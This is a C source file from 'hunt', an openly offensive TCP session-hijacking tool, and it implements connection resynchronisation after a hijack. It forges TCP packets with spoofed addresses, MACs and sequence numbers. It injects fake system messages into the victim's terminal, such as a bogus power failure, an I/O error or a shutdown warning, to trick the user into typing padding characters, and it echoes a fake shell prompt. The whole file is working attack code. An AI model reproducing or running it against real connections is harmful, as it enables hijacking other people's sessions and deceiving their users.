/*
 *
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998 by kra
 *
 */
#include "hunt.h"
#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <assert.h>

/*
 * functions with ACK storm avoidance
 */
void func_hijack_dst_sync(struct packet *p, struct conn_info *arg)
{
#if 0
	static unsigned int last_seq = 0;
	static unsigned int last_ack = 0;
#endif	
	if (p->p_iph->saddr == arg->dst_addr &&
	    p->p_iph->daddr == arg->src_addr &&
	    p->p_hdr.p_tcph->source == arg->dst_port &&
	    p->p_hdr.p_tcph->dest == arg->src_port) {
#if 0	
		if (last_seq == p->p_hdr.p_tcph->seq &&
		    last_ack == p->p_hdr.p_tcph->ack_seq) {
			printf(".");
			fflush(stdout);
			return;
		}
		last_seq = p->p_hdr.p_tcph->seq;
		last_ack = p->p_hdr.p_tcph->ack_seq;
#endif
		packet_want(p);
		list_produce(&l_hijack_conn, p);
	}
}

void func_hijack_src_sync(struct packet *p, struct conn_info *arg)
{
#if 0
	static unsigned int last_seq = 0;
	static unsigned int last_ack = 0;
#endif	
	if (p->p_iph->saddr == arg->src_addr &&
	    p->p_iph->daddr == arg->dst_addr &&
	    p->p_hdr.p_tcph->source == arg->src_port &&
	    p->p_hdr.p_tcph->dest == arg->dst_port) {
#if 0		
		if (last_seq == p->p_hdr.p_tcph->seq &&
		    last_ack == p->p_hdr.p_tcph->ack_seq) {
			printf(".");
			fflush(stdout);
			return;
		}
		last_seq = p->p_hdr.p_tcph->seq;
		last_ack = p->p_hdr.p_tcph->ack_seq;
#endif
		packet_want(p);
		list_produce(&l_hijack_conn, p);
	}
}



int user_hijack_sync(struct user_conn_info *uci)
{
	struct conn_info *ci;
	int retval;
	
	if (!(ci = conn_get(uci))) {
		printf("connection isn't available\n");
		retval = 1;
	} else {
		if ((retval = hijack_sync(ci)) < 0)
			printf("sync failed\n");
		conn_free(ci);
	}
	return retval;
}

static char *suggest_sync_msg(int first)
{
	static int count = 0;
	static int old_count = 0;
	char *retval;
	
	char *m1[] = {"\r\nmsg from root: power failure - try to type %d chars\r\n",
		      "\r\nfuck you type %d chars immediately\r\n",
		      "\r\nI/O failure detected, %d chars will solve it\r\n",
		      "\r\nmachine is going down within 5 min, type %d chars\r\n",
		      "\r\nsegmentation fault - %d chars to resume\r\n"
	};
	char *m2[] = {"\r\npower failure detected\r\n... power resumed, ok\r\n",
		      "\r\nready\r\n",
		      "\r\nI/O resumed\r\n",
		      "\r\nmachine shutdown canceled\r\n",
		      "\r\nyou have new mail\r\n"
	};
	if (first) {
		retval = m1[count];
		old_count = count;
		count = (count + 1) % (sizeof(m1) / sizeof(char *));
	} else {
		retval = m2[old_count];
	}
	return retval;
}

volatile int need_read, need_write;
volatile int sync_was_canceled;
volatile int f_sync_done;
int nw_was_negative;

static void hijack_sync_init_msg(struct conn_info *ci)
{
	int len, msg_len;
	char buf[128];
	struct tcp_spec ts;
	
	/*
	 * print message to user
	 */
	need_read = ntohl(ci->dst.next_d_seq) - ntohl(ci->src.next_seq);
	need_write = ntohl(ci->dst.next_seq) - ntohl(ci->src.next_d_seq);
	printf("user have to type %d chars and print %d chars to synchronize connection\n", need_read, need_write);
	ctrl_c_prompt();	
	if (need_read <= 0) {
/*		printf("ok, handle %d chars myself\n", need_read);*/
		return;
	}
	if (need_write <= 0) {
/*		printf("ok, handle %d print chars myself\n", need_write);*/
		return;
	}
	len = need_write - need_read;
	msg_len = sprintf(buf, suggest_sync_msg(1), need_read);
	if (len >= msg_len) {
		len = msg_len;
		memset(&ts, 0, sizeof(ts));
		ts.saddr = ci->dst_addr;
		ts.daddr = ci->src_addr;
		ts.sport = ci->dst_port;
		ts.dport = ci->src_port;
		ts.src_mac = ci->src.dst_mac;
		ts.dst_mac = ci->src.src_mac;
		ts.seq = ci->src.next_d_seq;
		ts.ack_seq = ci->src.next_seq;
		ts.window = ci->dst.window ? ci->dst.window : htons(242);
		ts.id = htons(ntohs(ci->dst.id) + 1);
		ts.ack = 1;
		ts.psh = 1;
		ts.rst = 0;
		ts.data = buf;
		ts.data_len = len;
		need_write -= len;
#if 0
		printf("write send/src seq = %u, ack = %u\n", ntohl(ts.seq), ntohl(ts.ack_seq));
		printf("           dst seq = %u, ack = %u\n", ntohl(ci->dst.next_seq), ntohl(ci->dst.next_d_seq));
#endif
		send_tcp_packet(&ts);
	} else {
		/*
		 * be silent
		 */
	}
}

/*
 * well we have to be faster than destination end because it will send
 * packet which causes our packet to be dropped, so we need send it
 * as fast as posible
 */
#ifdef SYNC_FAST
pthread_cond_t cond_hijack_sync;
pthread_mutex_t mutex_hijack_sync;
#endif

static int need_read_want_n = 0;
static int need_write_want_n = 0;

static void need_read_write_init()
{
	need_read_want_n = -100000;
	need_write_want_n = -100000;
}

static void need_read_write_negative(struct conn_info *ci)
{
	struct tcp_spec ts;
	char buf[1400];
	int len;

	/*
	 * well - after sending something we get usualy ack storm
	 */
	if (need_read > 0 && need_write > 0)
		return;
	if (need_read_want_n > need_read || need_write_want_n > need_write)
		return;
	if (need_read < need_write)
		len = -need_read;
	else
		len = -need_write;
	if (len > sizeof(buf))
		len = sizeof(buf);
	memset(buf, ' ', len);
	ts.saddr = ci->src_addr;
	ts.daddr = ci->dst_addr;
	ts.sport = ci->src_port;
	ts.dport = ci->dst_port;
	ts.src_mac = ci->dst.dst_mac;
	ts.dst_mac = ci->dst.src_mac;
	ts.seq = ci->dst.next_d_seq;
	ts.ack_seq = ci->dst.next_seq;
	ts.window = ci->src.window ? ci->src.window : htons(242);
	ts.ack = 1;
	ts.psh = 1;
	ts.rst = 0;
	ts.data = buf;
	ts.data_len = len;
	send_tcp_packet(&ts);
	need_read += len;
	need_write += len;
	need_read_want_n = need_read;
	need_write_want_n = need_write;
}

static void need_write_positive(struct conn_info *ci, char *data, int data_len)
{
	struct tcp_spec ts;
	char buf[BUFSIZE];
	char fin_msg[BUFSIZE];
	int fin_msg_len;
	int len;

	sprintf(fin_msg, suggest_sync_msg(0));
	fin_msg_len = strlen(fin_msg);
	if (!data) {
#if 0 /* it doesn't work properly in ACK storm  - 
		some bug fixed maybe it will work*/
		if ((len = need_write - fin_msg_len) <= 0)
			len = need_write;
		if (len > sizeof(buf))
			len = sizeof(buf);
		if (len == fin_msg_len)
			memcpy(buf, fin_msg, len);
		else
			memset(buf, ' ', len);
#else
		len = need_write;
		if (len > sizeof(buf)) {
			len = sizeof(buf);
			memset(buf, ' ', len);
		} else {
			if (len > fin_msg_len) {
				memset(buf, ' ', len - fin_msg_len);
				memcpy(buf + len - fin_msg_len, fin_msg, fin_msg_len);
			} else
				memcpy(buf, fin_msg + (fin_msg_len - len), len);
		}	
		data = buf;
		data_len = len;
	}
#endif
	memset(&ts, 0, sizeof(ts));
	ts.saddr = ci->dst_addr;
	ts.daddr = ci->src_addr;
	ts.sport = ci->dst_port;
	ts.dport = ci->src_port;
	ts.src_mac = ci->src.dst_mac;
	ts.dst_mac = ci->src.src_mac;
	ts.seq = ci->src.next_d_seq;
	ts.ack_seq = ci->src.next_seq;
	ts.window = ci->dst.window ? ci->dst.window : htons(242);
	ts.id = htons(ntohs(ci->dst.id) + 1);
	ts.ack = 1;
	ts.psh = 1;
	ts.rst = 0;
	ts.data = data;
	ts.data_len = data_len;
	send_tcp_packet(&ts);
	need_write -= data_len;
#if 0
	printf("write send/src seq = %u, ack = %u\n", ntohl(ts.seq), ntohl(ts.ack_seq));
	printf("           dst seq = %u, ack = %u\n", ntohl(ci->dst.next_seq), ntohl(ci->dst.next_d_seq));
#endif
}

static void need_read_positive(struct packet *p, struct conn_info *ci)
{
	struct tcp_spec ts;

	memset(&ts, 0, sizeof(ts));
	ts.saddr = ci->dst_addr;
	ts.daddr = ci->src_addr;
	ts.sport = ci->dst_port;
	ts.dport = ci->src_port;
	ts.src_mac = ci->src.dst_mac;
	ts.dst_mac = ci->src.src_mac;
	ts.seq = ci->src.next_d_seq;
	ts.ack_seq = ci->src.next_seq;
	ts.window = ci->dst.window ? ci->dst.window : htons(242);
	ts.id = htons(ntohs(ci->dst.id) + 1);
	ts.ack = 1;
	ts.psh = 1;
	ts.rst = 0;
	ts.data = p->p_data;
	ts.data_len = p->p_data_len;
	if (p->p_data[0] == '\r' || p->p_data[0] == '\n') {
		ts.data = "\r\n$ ";
		ts.data_len = 4;
	} else {
		ts.data = p->p_data;
		ts.data_len = p->p_data_len;
	}
	send_tcp_packet(&ts);
	need_read -= p->p_data_len;
	need_write -= p->p_data_len;
#if 0
	printf("need read = %d, send/src seq = %u, ack = %u\n", need_read, ntohl(ts.seq), ntohl(ts.ack_seq));
	printf("                     dst seq = %u, ack = %u\n", ntohl(ci->dst.next_seq), ntohl(ci->dst.next_d_seq));
#endif
}

void f_hijack_sync(struct packet *p, struct conn_info *ci)
{
	static unsigned int last_read_ack, dst_last_ack;
	struct tcp_spec ts;
	char buf[512], *w_data;
	int len;
	
#if 0
	if (p->p_ipc != 0) {
		need_read = ntohl(ci->dst.next_d_seq) - ntohl(ci->src.next_seq);
		need_write = ntohl(ci->dst.next_seq) - ntohl(ci->src.next_d_seq);
		if (need_read < 0)
			need_read_negative(ci);
#ifndef SYNC_FAST
		packet_free(p);
#endif
		return;		
	}
#endif
	if (p->p_iph->saddr == ci->src_addr &&
	    p->p_iph->daddr == ci->dst_addr &&
	    p->p_hdr.p_tcph->source == ci->src_port &&
	    p->p_hdr.p_tcph->dest == ci->dst_port) {
	/*
	 * packet from source
	 */
	need_read = ntohl(ci->dst.next_d_seq) - ntohl(ci->src.next_seq);
	need_write = ntohl(ci->dst.next_seq) - ntohl(ci->src.next_d_seq);
		
	if (need_read) {
		if (need_read > 0 && need_write >= 0) {
			if (p->p_data_len > 0) {
				print_data_packet(p, p->p_data_len, 0, 0);
				need_read_positive(p, ci);
				last_read_ack = htonl(ntohl(ci->src.next_d_seq)
						      + p->p_data_len);
			}

		} else {
			need_read_write_negative(ci);
		}
	} else if (need_write > 0) { /* need read == 0 */
		if (p->p_data_len)
			print_data_packet(p, p->p_data_len, 0, 0);
		if (last_read_ack == p->p_hdr.p_tcph->ack_seq && p->p_data_len) {
			len = p->p_data_len;
			if (len > sizeof(buf))
				len = sizeof(buf);
			memcpy(buf, p->p_data, len);
			w_data = buf;
		} else {
			len = 0;
			w_data = NULL;
		}
		need_write_positive(ci, w_data, len);
	} else if (need_write < 0) {
		need_read_write_negative(ci);
	} else { /* need_read == 0 && need_write == 0 */
#if 0
		printf("need_write %d, need_read %d, src seq = %u, ack = %u\n", need_read, need_write, ntohl(ci->src.next_seq), ntohl(ci->src.next_d_seq));
		printf("                           dst seq = %u, ack = %u\n", ntohl(ci->dst.next_seq), ntohl(ci->dst.next_d_seq));
#endif
#if SYNC_FAST
		pthread_mutex_lock(&mutex_hijack_sync);
#endif
		f_sync_done = 1;
#if SYNC_FAST
		pthread_cond_signal(&cond_hijack_sync);
		pthread_mutex_unlock(&mutex_hijack_sync);
#endif
	} 
	} else {
		if (p->p_iph->saddr == ci->dst_addr &&
		    p->p_iph->daddr == ci->src_addr &&
		    p->p_hdr.p_tcph->source == ci->dst_port &&
		    p->p_hdr.p_tcph->dest == ci->src_port) {
			need_read = ntohl(ci->dst.next_d_seq) - ntohl(ci->src.next_seq);
			need_write = ntohl(ci->dst.next_seq) - ntohl(ci->src.next_d_seq);

			if (dst_last_ack != ci->dst.next_seq) {
			    /* packet from dst - ACK it */
				ts.saddr = ci->src_addr;
				ts.daddr = ci->dst_addr;
				ts.sport = ci->src_port;
				ts.dport = ci->dst_port;
				ts.src_mac = ci->dst.dst_mac;
				ts.dst_mac = ci->dst.src_mac;
				ts.seq = ci->dst.next_d_seq;
				ts.ack_seq = ci->dst.next_seq;
				ts.window = ci->src.window ? ci->src.window : htons(242);
				ts.ack = 1;
				ts.psh = 1;
				ts.rst = 0;
				ts.data = NULL;
				ts.data_len = 0;
				send_tcp_packet(&ts);
				
				dst_last_ack = ts.ack_seq;
			
				if (need_read < 0 || need_write < 0) {
					need_read_write_negative(ci);
				} else if (need_read == 0) {
					if (need_write > 0)
						need_write_positive(ci, NULL, 0);
				} else { /* need read > 0 */
					if (nw_was_negative) {
						nw_was_negative = 0;
						hijack_sync_init_msg(ci);
					}
				}
			}
			if (need_read == 0 && need_write == 0) {
				f_sync_done = 1;
			}
		}
	}
#ifndef SYNC_FAST
	packet_free(p);
#endif
}

void ctrl_c_sync_handler(int signr)
{
	sync_was_canceled = 1;
	f_sync_done = 1;
}

int hijack_sync(struct conn_info *ci)
{
	struct ifunc_item ifunc_f, ifunc_dst;
	struct timespec absts;
	struct timeval now;
	struct sigaction sac, old_sac;
	struct packet *p;
	
	nw_was_negative = 0;
	f_sync_done = 0;
	list_produce_start(&l_hijack_conn);
#ifdef SYNC_FAST
	pthread_mutex_init(&mutex_hijack_sync, NULL);
	pthread_cond_init(&cond_hijack_sync, NULL);
	ifunc_f.func = (void(*)(struct packet *, void *)) f_hijack_sync;
	ifunc_f.arg = ci;
	list_enqueue(&l_ifunc_fast_tcp, &ifunc_f);
#else
	ifunc_f.func = (void(*)(struct packet *, void *)) func_hijack_src_sync;
	ifunc_f.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_f);

	ifunc_dst.func = (void(*)(struct packet *, void *)) func_hijack_dst_sync;
	ifunc_dst.arg = ci;
	list_enqueue(&l_ifunc_tcp, &ifunc_dst);
#endif
	
	/* do this that you can interupt pthread_cond_timedwait through ctrl-c */
	gettimeofday(&now, NULL);
	absts.tv_sec = now.tv_sec + 100000;
	absts.tv_nsec = 0;

	hijack_sync_init_msg(ci);

	sync_was_canceled = 0;
	sac.sa_handler = ctrl_c_sync_handler;
	sigemptyset(&sac.sa_mask);
	sigaddset(&sac.sa_mask, SIGINT);
	sac.sa_flags = SA_RESTART;
	sigaction(SIGINT, &sac, &old_sac);

#ifdef SYNC_FAST
	need_read_write_init();
	if (need_read < 0 || need_write < 0)
		need_read_write_negative(ci);
	pthread_mutex_lock(&mutex_hijack_sync);
	while (!f_sync_done) {
		pthread_cond_timedwait(&cond_hijack_sync, &mutex_hijack_sync,
				       &absts);
	}
	pthread_mutex_unlock(&mutex_hijack_sync);
	list_remove(&l_ifunc_fast_tcp, &ifunc_f);
#else
	if (need_write < 0)
		nw_was_negative = 0;
	need_read_write_init();
	if (need_read < 0 || need_write < 0)
		need_read_write_negative(ci);
	if (need_read != 0 || need_write != 0) {
		while (1) {
			if (!f_sync_done && (p = list_consume(&l_hijack_conn, NULL))) {
				f_hijack_sync(p, ci);
			} else
				break;
			if (sync_was_canceled)
				break;
		}
	}
	list_remove(&l_ifunc_tcp, &ifunc_f);
	list_remove(&l_ifunc_tcp, &ifunc_dst);
#endif
	packet_flush(&l_hijack_conn);

	if (sync_was_canceled)
		press_key("\n-- press any key> ");
	sigaction(SIGINT, &old_sac, NULL);
#if 0
	struct timespec relts;
	/*
	 * wait a while - conn will be updated from ACK
	 */
	relts.tv_sec = 1;
	relts.tv_nsec = /* 500000000 */ 0;
	nanosleep(&relts, NULL);
	need_read = ntohl(ci->dst.next_d_seq) - ntohl(ci->src.next_seq);
	need_write = ntohl(ci->dst.next_seq) - ntohl(ci->src.next_d_seq);
	if (!need_read && !need_write)
		return 0;
	else {
		printf("final need read %d, need write %d\n", need_read, need_write);
		if (need_read > -4 && need_read < 4 && need_write > -4 && need_write < 4)
			printf("maybe the synchronization was successful\n");
		return -1;
	}
#else
	if (sync_was_canceled)
		return -1;
	else
		return 0;
#endif
}
